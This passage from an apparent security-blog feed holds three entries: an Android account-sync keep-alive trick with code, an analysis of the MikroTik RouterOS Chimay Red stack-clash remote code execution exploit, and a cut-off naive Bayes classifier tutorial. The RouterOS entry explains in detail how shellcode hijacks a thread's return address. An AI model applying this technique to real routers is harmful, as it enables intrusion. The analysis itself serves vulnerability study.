<h4 id="实现代码："><a href="#实现代码：" class="headerlink" title="实现代码："></a>实现代码：</h4><p>MainActivity类：<br><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">Bundle </span><span class="keyword">bundle </span>= new <span class="keyword">Bundle();</span></div><div class="line">ContentResolver.setIsSyncable(account, AccountProvider.AUTHORITY, <span class="number">1</span>)<span class="comment">;</span></div><div class="line">ContentResolver.setSyncAutomatically(account, AccountProvider.AUTHORITY, true)<span class="comment">;</span></div><div class="line">ContentResolver.setMasterSyncAutomatically(true)<span class="comment">;</span></div><div class="line">ContentResolver.<span class="keyword">addPeriodicSync(account, </span>AccountProvider.AUTHORITY, <span class="keyword">bundle, </span><span class="number">300</span>)<span class="comment">;//开启同步</span></div><div class="line"></div><div class="line"><span class="keyword">SyncService类：</span></div><div class="line">@Override</div><div class="line">public void onPerformSync(Account account, <span class="keyword">Bundle </span><span class="keyword">bundle, </span>String s, ContentProviderClient contentProviderClient, <span class="keyword">SyncResult </span><span class="keyword">syncResult) </span>&#123;</div><div class="line">            Intent i = new Intent(<span class="keyword">SyncService.this, </span>TestActivity.class)<span class="comment">;//开启活动</span></div><div class="line">            startActivity(i)<span class="comment">;</span></div><div class="line">        &#125;</div></pre></td></tr></table></figure></p>
<p>我们在mainActivity利用ContentResolver去开启账户同步，设置同步周期，然后系统执行同步操作时，会执行onPerformSync()方法，我在该方法中去开启APP中的TestActivity活动。</p>
<h4 id="实现截图："><a href="#实现截图：" class="headerlink" title="实现截图："></a>实现截图：</h4><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/78534yf39jsdjer/20.png" alt=""><br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/78534yf39jsdjer/21.png" alt=""></p>
<h4 id="漏洞修复：-2"><a href="#漏洞修复：-2" class="headerlink" title="漏洞修复："></a>漏洞修复：</h4><p>由于该机制可定制度太高，而且比较冷门的功能，因此google一直没有去修补这块，不过小米有阉割掉了这里的拉活，而且刚刚用原生Android 8.0系统测了一下，貌似也是拉活不了。8.0以下都可以拉活。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>Android账户机制本身意义是google为了方便用户，不需要总是APP登录和验证账户信息，由系统来维护这些账户的验证。换个思路，这就是为攻击者提供了可以利用的提取系统权限的攻击点。我们在之后的研究可以多找找有系统提供的服务或者间接调用了系统服务的功能，这样可以让系统为我们“服务”。<br>目前大多数手机厂商针对于账户机制这些相对冷门的功能没有太大的关注，所以在各自品牌手机的rom包中，对于这些机制也未再进行认真的检验处理，这样也就导致很多原生系统存在的漏洞，在各大手机厂商上面同样可以进行攻击，所以需要系统开发人员认真的关注这些功能。</p>
<p>##参考文档：<br>LAUNCHANYWHERE: ACTIVITY组件权限绕过漏洞解析(GOOGLE BUG 7699048 )：<br><a href="http://blogs.360.cn/360mobile/2014/08/19/launchanywhere-google-bug-7699048/" rel="external nofollow noopener noreferrer" target="_blank">http://blogs.360.cn/360mobile/2014/08/19/launchanywhere-google-bug-7699048/</a></p>
<p>Android BroadcastAnyWhere(Google Bug 17356824)漏洞详细分析：<br><a href="https://blog.csdn.net/l173864930/article/details/41246255/" rel="external nofollow noopener noreferrer" target="_blank">https://blog.csdn.net/l173864930/article/details/41246255/</a></p>
<p>android添加账户源码浅析：<br><a href="http://www.cnblogs.com/vendanner/p/5122865.html" rel="external nofollow noopener noreferrer" target="_blank">http://www.cnblogs.com/vendanner/p/5122865.html</a></p>
<p>broadAnywhere：Broadcast组件权限绕过漏洞（Bug: 17356824）<br><a href="http://blogs.360.cn/360mobile/2014/11/14/broadanywhere-bug-17356824/" rel="external nofollow noopener noreferrer" target="_blank">http://blogs.360.cn/360mobile/2014/11/14/broadanywhere-bug-17356824/</a></p>
<p>Android的账号与同步机制<br><a href="https://blog.csdn.net/hehui1860/article/details/36900775" rel="external nofollow noopener noreferrer" target="_blank">https://blog.csdn.net/hehui1860/article/details/36900775</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;Android 2.0中加入了一个新的包android.accounts，该包主要包括了集中式的账户管理API，用以安全地存储和访问认证的令
    
    </summary>
    
      <category term="移动安全" scheme="http://www.future-sec.com/categories/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="移动安全" scheme="http://www.future-sec.com/tags/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/"/>
    
      <category term="Android" scheme="http://www.future-sec.com/tags/Android/"/>
    
  </entry>
  
  <entry>
    <title>MikroTik RouterOS &lt; 6.38.4 (x86) 远程代码执行漏洞分析</title>
    <link href="http://www.future-sec.com/MikroTik-RouterOS-lt-6.38.4-remote-code-execution.html"/>
    <id>http://www.future-sec.com/MikroTik-RouterOS-lt-6.38.4-remote-code-execution.html</id>
    <published>2018-04-14T16:00:00.000Z</published>
    <updated>2018-06-29T09:01:06.020Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>《Vault 7》是由维基解密从2017年3月7日开始，发布的一系列文件。其中详细描述了美国中央情报局(Central Intelligence Agency)执行电子监视和网络战的细节活动和能力。Chimay Red是Vault 7中泄漏的CIA Hacking Tools中包含的一个用于exploit运行Router OS的MikroTik(MT) 路由器的一个工具，此工具可用来向MT路由器上传HIVE（Vault7中泄漏出的一个CIA远程控制工具）或者shellcode等payload。Vault7泄露的文档中只包含了<a href="https://wikileaks.org/ciav7p1/cms/page_16384604.html" rel="external nofollow noopener noreferrer" target="_blank">工具的使用手册</a>，但此工具并未公开。BigNerd95在github上的<a href="https://github.com/BigNerd95/Chimay-Red" rel="external nofollow noopener noreferrer" target="_blank">Chiamy Red项目</a>根据RouterOS的补丁对Chimay Red中使用的漏洞进行了揭露并给出了poc。</p>
<p>此文档主要是对BigNerd95的Chiamy Red项目中使用的 Stack Clash Remote Code Execution漏洞及给出的exp进行细节分析。 环境搭建及使用的漏洞具体可参考<a href="https://github.com/BigNerd95/Chimay-Red/blob/36faf04e9ffb224811e0ac074a62126fdca7a92f/docs/ChimayRed.pdf" rel="external nofollow noopener noreferrer" target="_blank">这里</a>。此漏洞存在于RouterOS 6.38.4版本以下，在<a href="https://mikrotik.com/download/changelogs/current-release-tree" rel="external nofollow noopener noreferrer" target="_blank">6.38.5版本</a>中被修补。 </p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>从BigNerd95给出的文档中，我们可以知道此漏洞存在于www二进制文件中的Request::readPostData函数中。我们可以使用Chiamy Red项目中的getROSbin.py工具从RouterOS镜像中提取www二进制文件，命令如下：<br><code>$ ./tools/getROSbin.py 6.38.4 x86 /nova/bin/www www_binary</code><br>使用IDA查看Request::readPostData函数 :<img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic5/1.png" alt="1"></p>
<p>可以看到，该函数先使用Headers::getHeader函数获取content_length字段的值，然后并未对值进行判断就传入了alloca函数，随后使用istream:read函数将content_len_velue长度的数据读取到了当前函数的栈帧中。</p>
<p>alloca函数具体进行的操作如下图:<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic5/2.png" alt="2"><br>alloca函数将content_len_velue进行对齐之后，在当前栈帧上分配了对应大小的空间，这将允许我们直接控制当前栈帧的栈顶位置。</p>
<p>如果我们传入content_length的值为2147483648[-2147483648]到4294967295[-1]之间的任意值，则栈顶指针将不是向上增长而是向下移动指向已使用的栈区位置，然后istream::read会从socket读取content_len_velue长度的数据到当前栈顶指定的缓冲区内，这将引起栈粉碎。并且由于istream::read的第二个参数类型为uint，istream::read会读取至少2147483648字节的数据到栈上，这很明显会超出当前栈底，在istream::read函数返回之前生成一个SEGFAULT错误。现在看来这似乎是一个不可执行代码的漏洞，那么如何才能达到代码执行的目的呢？<br>可以先看一下Chiamy Red项目中的exp是怎么写的。如下图，先创建两个socket，分别向两个socket发送了指定了content_length的post header数据，并向s1发送了n个‘A’和payload，然后将s2关闭。从注释也可看出，其利用方式和线程栈有关。 </p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic5/3.png" alt="3"></p>
<p>再来看看Request::readPostData函数是在哪里被调用的，使用IDA查看Request::readPostData的交叉引用发现www中没有引用此函数的位置。现在我们动态调试下，看看此函数在哪里被调用。telnet连接上RouterOS,把RouterOS的ALSR保护关闭掉，然后kill掉www进程之后系统会自动重启www程序（以下所有图片为多次调试www程序所截图像，所以进程号会有所不同，但并不影响我们的分析） </p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic5/4.png" alt="4"></p>
<p>使用gdbserver附加到www进程上，使用gdb远程调试。 </p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic5/5.png" alt="5"></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic5/6.png" alt="6"></p>
<p>我们把断点下在调用alloca函数处 </p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic5/7.png" alt="7"></p>
<p>然后使用Chiamy Red项目中的exp把payload打到目标上 </p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic5/8.png" alt="8"></p>
<p>可以看到有两个新线程被创建，并且在线程2中触发了断点，说明Request::readPostData函数是在新线程中被调用的，并且栈顶寄存器指向0x77d86180 </p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic5/9.png" alt="9"></p>
<p>我们看一下0x77d86180在内存空间的哪个位置 </p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic5/10.png" alt="10"></p>
<p>可以看到0x77d86180并不位于进程内存空间的栈区，而是位于库文件加载区域中的一段空闲内存空间中，并且我们可以计算出分配给线程2的线程栈内存大小为0x77d87000-0x77d68000=0x1f000=124kb,继续运行www发现在线程3中断点又被触发了一次，且此次的栈顶寄存器指向0x77d66180，可以看到线程3的线程栈位于线程2的线程栈的上方且大小同为0x77d67000-0x77d48000=0x1f000=124kb,中间相隔0x77d68000-0x77d67000=0x1000=4kb的保护区。 </p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic5/11.png" alt="11"></p>
<p>现在线程栈在内存空间中的布局清楚了。现在从新开启调试，在alloca调用处下断点，continue并且重新打上payload，程序中断在线程2的alloca调用处，向下单步3条指令 </p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic5/12.png" alt="12"></p>
<p>此时线程3中的断点被触发，并且调试线程切换到了线程3,因为我们现在要调试线程2,所以先把线程3暂停，设置gdb的调度器锁到on状态，然后切换回线程2继续调试 </p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic5/13.png" alt="13"></p>
<p>单步到sub %eax,%esp指令处查看当前esp的值为0x77d86180，对照进程的内存空间布局，可以看到现在esp依然指向线程2的线程栈内，单步步过sub指令，然后再次查看esp的值为0x77d5d170，现在esp已经指向线程3的线程栈内了<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic5/14.png" alt="14"></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic5/15.png" alt="15"></p>
<p>继续向下运行到istream::read函数调用处，查看栈中函数的参数，可以看到read函数会读取0x29000字节的数据到0x77d5d170处，正好是刚才alloca函数调整过的栈顶位置 0x77d5d170 </p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic5/16.png" alt="16"></p>
<p>继续单步步过read函数，重新查看0x77d5d170处有什么数据，发现此位置的数据并没有更新，read函数读取失败了，我们先把这个问题暂时放在这里，继续我们下面的调试，因为我们主要关注地址偏移量 </p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic5/17.png" alt="17"></p>
<p>查看下exp脚本都向s1发送了什么数据，注意到发往s1的数据部分是分两次发送的，两次发送期间向s2发送了构造的http头，现在我们来计算一下向s1发送了n个‘A’之后，read函数会读取到多少个‘A’,由脚本的宏定义可以计算出SKIP_SPACE-ALIGN_SIZE-ADDRESS_SIZE=0xfec,read函数在读取0xfec个‘A’之后，edi寄存器指向的位置在0x77d5d170+0xfec=0x77d5e15c，注意read再往后读取的数据就是shellcode了，就是说0x77d5e15c是shellcode的起始位置，并且此位置位于线程3的线程栈内 </p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic5/18.png" alt="18"></p>
<p>现在切换到线程3,继续调试，看看0x77d5e15c在线程3的线程栈中扮演了什么角色 </p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic5/19.png" alt="19"></p>
<p>线程3的栈顶在经过调整之后指向0x77d5e170处，此处已经离0x77d5e15c不远了。继续运行到read函数的调用处，查看栈中的数据，发现此时栈顶指针指向0x77d5e160处，离0x77d5e15c只有四个字节，在调用call read指令后将read函数的返回地址存储到0x77d5e15c的位置，刚才分析到0x77d5e15c是shellcode的起始地址，此处可以劫持read函数的返回地址达到任意代码执行的目的。由于线程3的read函数会向0x77d5e170处写入数据，此处内存空间也是存储shellcode的空间，因此，不能向s2发送任何数据http协议的数据部分，否则将会赋盖shellcode，Chiamy Red项目中exp的作者使用close(s2)的方式来让线程3中的read函数返回，以运行shellcode。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic5/20.png" alt="20"></p>
<p>关于调试过程中出现的read函数读取失败的问题，可能是由于中断的时间太长导致socket超时引起的，直接把断点下在read函数调用下面，直接run至断点处，就能看到read函数读取成功了。</p>
<h2 id="exploit分析"><a href="#exploit分析" class="headerlink" title="exploit分析"></a>exploit分析</h2><p>最后正向梳理下exp作者的利用思路。传入负值可以复写当前线程栈的函数返回地址，但由于read函数的第二个参数类型为uint，写入内存的长度超长会在read函数返回之前就引发段错误导致程序异常退出；由于线程栈内存段是相邻的，且同一进程中的所有线程共享资源，那么可以赋写其他线程栈的函数返回地址，因为alloca函数可以分配栈空间，先通过content_length参数在线程2的线程栈上分配出容纳shellcode的内存空间，然后确定read函数的返回地址的存储位置ADDR，利用content_length调整线程1的线程栈栈顶寄存器指向ADDR之后的地址，然后使用‘A’作填充，使shellcode正好覆盖到ADDR处存储的返回地址达到任意代码执行的目的。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;《Vault 7》是由维基解密从2017年3月7日开始，发布的一系列文件。其中详细描述了美国中央情报局(Central Intelligen
    
    </summary>
    
      <category term="系统安全" scheme="http://www.future-sec.com/categories/%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="系统安全" scheme="http://www.future-sec.com/tags/%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>贝叶斯分类器</title>
    <link href="http://www.future-sec.com/bayesian-classifier.html"/>
    <id>http://www.future-sec.com/bayesian-classifier.html</id>
    <published>2018-04-07T16:00:00.000Z</published>
    <updated>2018-06-29T09:01:11.757Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>贝叶斯模型在机器学习以及人工智能中都有出现，<a href="https://github.com/Sunkist-Cherry/cherry" rel="external nofollow noopener noreferrer" target="_blank">cherry分类器</a>使用了朴素贝叶斯模型算法，<strong>经过简单的优化，使用1000个训练数据就能得到97.5%的准确率。</strong>虽然现在主流的框架都带有朴素贝叶斯模型算法，大多数开发者只需要直接调用api就能使用。但是在实际业务中，面对不同的数据集，必须了解算法的原理，实现以及懂得对结果进行分析，才能达到高准确率。</p>
<h2 id="cherry分类器"><a href="#cherry分类器" class="headerlink" title="cherry分类器"></a>cherry分类器</h2><p>###基础术语：<br><a href="(https://github.com/Sunkist-Cherry/cherry">cherry分类器</a>)默认支持中英文分类，用作例子的数据缓存中，中文训练数据包含<strong>正常</strong>，<strong>政治敏感</strong>，<strong>赌博</strong>，<strong>色情</strong>4个类别，英文训练数据包含<strong>正常邮件</strong>，<strong>垃圾邮件</strong>两个类别 (训练数据可以通过<a href="https://drive.google.com/file/d/1OtbY7RCjkoQWYb0fHIOTBcJfgDlW5Tjz/view?usp=sharing" rel="external nofollow noopener noreferrer" target="_blank">Google drive</a>下载)。调用非常容易，使用pip安装后，输入句子：</p>
<blockquote>
<p>警方召开了全省集中打击赌博违法犯罪活动专项行动电视电话会议。会议的重点是“查处”六合彩、赌球赌马等赌博活动。</p>
<blockquote>
<blockquote>
<p>import cherry<br>result = cherry.classify(‘警方召开了全省集中打击赌博违法犯罪活动专项行动电 电话会议。会议的重点是“查处”六合彩、赌球赌马等赌博活动。’)<br>    Building prefix dict from the default dictionary …<br>    Loading model from cache /var/folders/md/0251yy51045d6nknpkbn6dc80000gn/T/jieba.cache<br>    Loading model cost 0.894 seconds.<br>    Prefix dict has been built succesfully.</p>
</blockquote>
</blockquote>
</blockquote>
<p>分类器判断输入句子有99.7%的概率是正常句子，0.2%是政治敏感，剩余0.1%是其他两个类别</p>
<pre><code>&gt;&gt;&gt; result.percentage
[(&apos;normal.dat&apos;, 0.997), (&apos;politics.dat&apos;, 0.002), (&apos;gamble.dat&apos;, 0.0), (&apos;sex.dat&apos;, 0.0)]
</code></pre><p>其中对分类器判断影响最大的词语分别是<strong>赌博</strong>，<strong>活动</strong>，<strong>会议</strong>，<strong>违法犯罪</strong>，<strong>警方</strong>，<strong>打击</strong></p>
<pre><code>&gt;&gt;&gt; result.word_list
[(&apos;赌博&apos;, 8.5881312727226), (&apos;活动&apos;, 6.401543938544878), (&apos;会议&apos;, 6.091963362021649), (&apos;违法犯罪&apos;, 4.234845736802978), (&apos;警方&apos;, 3.536827626008435), (&apos;打击&apos;, 3.2491455535566542), (&apos;行动&apos;, 2.8561029654470476), (&apos;查处&apos;, 2.3860993362013083), (&apos;重点&apos;, 2.126816738271229), (&apos;召开&apos;, 1.8628511924367634), (&apos;专项&apos;, 1.1697040118768172), (&apos;电视电话会议&apos;, 1.1697040118768172), (&apos;全省&apos;, 0.47655683131687354), (&apos;集中&apos;, -0.6220554573512382), (&apos;六合彩&apos;, -2.29603189092291)]
</code></pre><h3 id="关键字过滤"><a href="#关键字过滤" class="headerlink" title="关键字过滤"></a>关键字过滤</h3><p>要理解分类器的原理，可以先从最简单的分类关键词算法开始，输入句子：</p>
<blockquote>
<p>奖金将在您完成首存后即可存入您的账户。真人荷官，六合彩，赌球欢迎来到全新番摊游戏！</p>
</blockquote>
<p>使用关键字算法，我们可以将<strong>真人荷官</strong>，<strong>六合彩</strong>这两个词语加入赌博类别的黑名单，每个类别都维持对应的黑名单表。当之后需要分类的时候，先判断关键字有没有出现在输入句子中，如果有，则判断为对应的类别。这个方法实现简单，但是缺点也很明显，误判率非常高，例如遇到输入句子：</p>
<blockquote>
<p>警方召开了全省集中打击赌博违法犯罪活动专项行动电视电话会议。会议的重点是“查处”六合彩、赌球赌马等赌博活动。</p>
</blockquote>
<p>这是一个正常的句子，但是由于包含<strong>六合彩</strong>，<strong>赌球</strong>这两个黑名单词语，关键字算法会误判其为赌博类别，同时，如果一个句子同时包含多个不同类别的黑名单词语，例如<strong>赌博</strong>，<strong>色情</strong>的话，关键字算法也无法判断正确。</p>
<h3 id="贝叶斯模型"><a href="#贝叶斯模型" class="headerlink" title="贝叶斯模型"></a>贝叶斯模型</h3><p>其实关键字算法已经接近贝叶斯模型的原理了，我们再仔细分析下关键字算法。<strong>关键字算法的问题在于只对输入句子中的部分词语进行分析，而没有对输入句子的整体进行分析。而贝叶斯模型会对输入句子的所有有效部分进行分析，通过训练数据计算出每个词语在不同类别下的概率，然后综合得出最有可能的结果。可以说，贝叶斯模型是关键字过滤加上统计学的升级版。</strong></p>
<p>当贝叶斯模型去判断输入句子：<br>​                                                </p>
<blockquote>
<p>警方召开了全省集中打击赌博违法犯罪活动专项行动电视电话会议。会议的重点是“查处”六合彩、赌球赌马等赌博活动。</p>
</blockquote>
<p>它会综合分析句子中的每个词语：</p>
<pre><code>警方，召开，全省，集中打击，... 六合彩，赌球，赌马，...
</code></pre><p>输入句子虽然包含<strong>六合彩</strong>，<strong>赌球</strong>这些赌博常出现的词语，但是<strong>警方</strong>，<strong>召开</strong>，<strong>集中打击</strong>这几个词代表这个句子极有可能是正常的句子。</p>
<h3 id="数学推导"><a href="#数学推导" class="headerlink" title="数学推导"></a>数学推导</h3><p>贝叶斯模型的数学推导非常简单，强烈建议大家静下心自己推导。</p>
<p>这里为了简单起见，我们只考虑句子是<strong>正常</strong>或者<strong>赌博</strong>两种可能，我们先复习一下概率论的基础表达：</p>
<blockquote>
<p>P(A) -&gt; A事件发生的概率，例如明天天晴的概率</p>
<p>P(A|B) -&gt; 条件概率，B事件发生的前提下A事件发生的概率，例如明天天晴而我又没带伞的概率</p>
<p>P(输入句子) -&gt; 这个句子在训练数据中出现的概率 </p>
<p>P(赌博) -&gt; 赌博类别的句子在训练数据中出现的概率</p>
<p>P(赌博|输入句子) -&gt; 输入句子是赌博类别的概率（也是我们最终要求的值）</p>
<p>P(赌博|输入句子) + P(正常|输入句子) = 100%</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/EngineGirl/enginegirl.github.io/master/images/bayes/bayes.png" alt="Bayes"></p>
<p>上图，中间重叠的部分是赌博和句子同时发生的概率P(赌博，输入句子)，可以看出：</p>
<blockquote>
<p>P(赌博|输入句子) = P(赌博，输入句子) / P(输入句子) (1)</p>
</blockquote>
<p>同理：</p>
<blockquote>
<p>P(输入句子|赌博) = P(赌博，输入句子) / P(赌博) (2)</p>
</blockquote>
<p>把(2)代入(1)得到</p>
<blockquote>
<p>P(赌博|输入句子) = P(输入句子|赌博) * P(赌博) / P(输入句子) (3)</p>
</blockquote>
<p>登登登灯，(3)就是贝叶斯模型定理。没看懂没关系，静下心再看一遍。<strong>要得到最终输入句子是赌博类别的概率P(赌博|输入句子)，需要知道右边3个量的值</strong>：</p>
<ol>
<li><p><strong>P(赌博)</strong></p>
<p> 指训练数据中，赌博类别的句子占训练数据的百分比。</p>
</li>
<li><p><strong>P(输入句子)</strong></p>
<p> 指这个输入句子出现在训练数据中的概率。我们最终目的是判断输入句子是哪个类别的概率比较高，也就是比较P(赌博|输入句子)与P(正常|输入句子)，由贝叶斯定理：</p>
<blockquote>
<p>P(赌博|输入句子) = P(输入句子|赌博) * P(赌博) / P(输入句子) (4)</p>
<p>P(正常|输入句子) = P(输入句子|正常) * P(正常) / P(输入句子) (5)</p>
</blockquote>
<p> 由于(4)，(5)都要除于相同的P(输入句子)，所以(4)，(5)右边可以同时乘以P(句子)，只比较等号右边前两个值的乘积的大小。</p>
<blockquote>
<p>P(赌博|输入句子) = P(输入句子|赌博) <em> P(赌博)<br>P(正常|输入句子) = P(输入句子|正常) </em> P(正常)</p>
</blockquote>
</li>
<li><p><strong>P(句子|赌博)</strong></p>
<p> <strong>最关键的就是求P(输入句子|赌博)</strong>，直接求输入句子在赌博类别句子中出现的概率非常困难，因为训练数据不可能包含所有句子，很可能并没有输入句子。什么意思呢？因为同一个句子，把词语进行不同的排列组合都能成立，例如：</p>
<blockquote>
<p>奖金将在您完成首存后即可存入您的账户。真人荷官，六合彩，赌球欢迎来到全新番摊游戏！</p>
</blockquote>
<p> 可以变成</p>
<blockquote>
<p>奖金将在您完成首存后即可存入您的账户。六合彩，赌球，真人荷官欢迎来到全新番摊游戏！</p>
</blockquote>
<p> 或者</p>
<blockquote>
<p>欢迎来到全新番摊游戏，奖金将在您完成首存后即可存入您的账户。六合彩，真人荷官，赌球！</p>
</blockquote>
<p> 稍微变换词语的位置就是一个新的句子了，训练数据不可能把所有排列组合的句子都加进去，因为实在太多了。<strong>所以当我们遇到一个输入句子，很可能它在训练数据中没有出现，那么P(输入句子|类别)对应的概率都为零，这显然不是真实的结果。也会导致我们的分类器出错</strong>，这个时候该怎么办呢？<strong>刚刚在<a href="#贝叶斯模型">贝叶斯模型</a>中我们提到，它会将一个句子分成不同的词语来综合分析，那我们是不是也可以把句子当成词语的集合呢？</strong></p>
<blockquote>
<p>警方召开了全省集中打击赌博违法犯罪活动专项行动电视电话会议。会议的重点是“查处”六合彩、赌球赌马等赌博活动。</p>
<p>警方召开了全省…赌马等赌博活动 = 警方 + 召开 + 全省…+赌博活动 </p>
</blockquote>
<p> 即：</p>
<blockquote>
<p>P(输入句子|赌博) = (P(词语1) <em> P(词语2|词语1) </em> P(词语3|词语2))|赌博) ≈ P(词语1)|P(赌博) <em> P(词语2)|P(赌博) </em> P(词语3)|P(赌博)</p>
<p>P(警方召开了全省…赌马等赌博活动。|赌博) = P(警方|赌博) <em> P(召开|赌博) </em> P(全省|赌博) …  <em> P(赌马|赌博) </em> P(赌博活动|赌博)</p>
</blockquote>
<p> 我们把P(输入句子|赌博)分解成所有P(词语|赌博)概率的乘积，然后通过训练数据，计算每个词语在不同类别出现的概率。最终获取的是<strong>输入句子有效词语在不同类别中的概率</strong>。</p>
</li>
</ol>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/pic-3/QQ%E6%88%AA%E5%9B%BE20180408145057.jpg" alt=""></p>
<p>在上面的例子中，虽然<strong>赌马</strong>，<strong>赌球</strong>，<strong>赌博活动</strong>这几个词是赌博类别的概率很高，但是综合所有词语，分类器判断输入句子有80%的概率是正常句子。<strong>简单来说，要判断句子是某个类别的概率，只需要计算该句子有效部分的词语的在该类别概率的乘积。</strong></p>
<h2 id="贝叶斯模型实现"><a href="#贝叶斯模型实现" class="headerlink" title="贝叶斯模型实现"></a>贝叶斯模型实现</h2><p>要计算每个词语在不同类别下出现的概率，有以下几个步骤：</p>
<ol>
<li>选择训练数据，标记类别</li>
<li>把所有训练数据进行分词，并且组成成一个包含所有词语的词袋集合</li>
<li>把每个训练数据转换成词袋集合长度的向量</li>
<li>利用每个类别的下训练数据，计算词袋集合中每个词语的概率</li>
</ol>
<h3 id="选择训练数据"><a href="#选择训练数据" class="headerlink" title="选择训练数据"></a>选择训练数据</h3><p>训练数据的选择是非常关键的一步，我们可以从网络上搜索符合对应类别的句子，使每个类别的数据各占一半。不过当你理解了贝叶斯模型的原理之后，你会发现一个难题问题，就是如何保持数据的独立分布，例如你选择的训练数据如下：</p>
<ul>
<li><p>赌博类别</p>
<blockquote>
<p>根据您所选择的上述六合彩游戏，您必须在娱乐场完成总金额（存款+首存奖金）16倍或15倍流水之后，方可申请提款。</p>
<p>奖金将在您完成首存后即可存入您的账户。真人荷官 六合彩 欢迎来到全新番摊游戏！</p>
</blockquote>
</li>
<li><p>正常类别</p>
<blockquote>
<p>Linux是一套免费使用和自由传播的类Unix操作系统，是一个基于POSIX和UNIX的多用户、多任务、支持多线程和多CPU的操作系统。</p>
<p>理查德·菲利普斯·费曼，美国理论物理学家，量子电动力学创始人之一，纳米技术之父。</p>
</blockquote>
</li>
</ul>
<p>我们可以注意到<strong>六合彩</strong>，<strong>游戏</strong>这两个词语，只在赌博类别的训练数据出现。这两个词语对句子是否是赌博类别会有很大的影响性，<strong>六合彩</strong>对赌博类别确实是重要的判别词，但是<strong>游戏</strong>这个词语本身和赌博没有直接的关系，却被错误划分为赌博类别相关的词语，当之后分类器遇到</p>
<blockquote>
<p>我们提供最新最全大型游戏下载，迷你游戏下载，并提供大量游戏攻略</p>
</blockquote>
<p>会因为里面的<strong>游戏</strong>，将它判断为赌博类别，</p>
<pre><code>&gt;&gt;&gt; result = cherry.classify(&apos;我们提供最新最全大型游戏下载，迷你游戏下载，并提供大量游戏攻略&apos;)
&gt;&gt;&gt; result.percentage
[(&apos;gamble.dat&apos;, 0.793), (&apos;normal.dat&apos;, 0.207)]
&gt;&gt;&gt; result.word_list
[(&apos;游戏&apos;, 1.9388011143762069)]
</code></pre><p>所以，当我们要做一个赌博/正常的分类器，我们需要在正常类别的训练数据添加：</p>
<blockquote>
<p>中国游戏第一门户站,全年365天保持不间断更新,您可以在这里获得专业的游戏新闻资讯,完善的游戏攻略专区</p>
</blockquote>
<p>这样的正常而且带有<strong>游戏</strong>关键字的句子。同时当训练数据过少，输入句子包含了训练数据中并没有c出现过的词语，该词语也会被分类器所忽略。<a href="(https://github.com/Sunkist-Cherry/cherry">cherry分类器</a>)可以通过启用debug模式得到被错误划分的数据以及其权重最高的词语，你可以根据输出的词语来调整训练数据。我们之后可以通过Adaboost算法动态调整每个词语的权重，这个功能我们会在下一个版本推出。 另外一方面，现实生活中，正常的句子比赌博类别的句子出现的概率要多得多，这点我们也可以从训练数据的比例上面体现，适当增加正常类别句子的数量，也可以赋予正常类别句子高权重，不过要小心<a href="https://en.wikipedia.org/wiki/Accuracy_paradox" rel="external nofollow noopener noreferrer" target="_blank">Accuracy_paradox</a>的问题。我们在<a href="#测试">测试</a>的时候，可以根据混淆矩阵以及ROC曲线来分析分类器的效果，再进行数据调整。</p>
<h3 id="词袋集合"><a href="#词袋集合" class="headerlink" title="词袋集合"></a>词袋集合</h3><p>为简单起见，本篇文章只选取4个句子作为训练数据：</p>
<ul>
<li><p>赌博类别：</p>
<blockquote>
<p>根据您所选择的上述礼遇，您必须在娱乐场完成总金额（存款+首存奖金）16倍或15倍流水之后，方可申请提款。</p>
